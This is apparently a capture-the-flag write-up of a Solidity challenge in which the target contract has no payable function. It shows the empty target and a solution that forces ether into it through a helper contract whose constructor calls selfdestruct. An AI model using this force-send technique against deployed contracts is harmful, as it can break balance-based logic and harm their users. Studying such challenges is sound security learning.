This contract contains nothing except its own declaration.

Our goal is to forcefully send this contract some ether.

We know that a contract needs to have a payable function or payable fallback function to receive ether, but there's still another way to accomplish this.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

We can create a contract that self destructs itself after sending some ether

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    function forceFunds(address to) external payable {
        new Boom{value: msg.value}(to);
    }
}
contract Boom {
    constructor(address to) payable {
        selfdestruct(payable(to));
    }
}
```

The Boom contract constructor sends ether to the address "to" and immediately destroys itself.

The result is that the receiving contract will be sent some ether, even though it doesn't have a payable callback function.